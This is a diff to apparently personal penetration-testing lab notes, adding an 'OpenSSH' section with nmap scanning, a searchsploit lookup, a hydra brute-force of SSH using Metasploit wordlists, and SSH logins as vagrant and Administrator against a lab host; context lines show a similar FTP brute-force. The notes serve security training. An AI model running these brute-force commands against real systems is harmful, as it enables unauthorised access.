@@ -1675,8 +1675,17 @@ ftp 10.0.28.97 21
 hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.28.97 ftp
 ftp 10.0.28.97 21 # give the username and password
 ```
-
-
+86)  Targeting OpenSSH
+```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV -sC -p 22 10.0.26.161 
+searchsploit OpenSSH 7.1
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.26.161 ssh
+ssh vagrant@10.0.26.161
+whoami
+ssh Administrator@10.0.26.161
+```
 
 
 
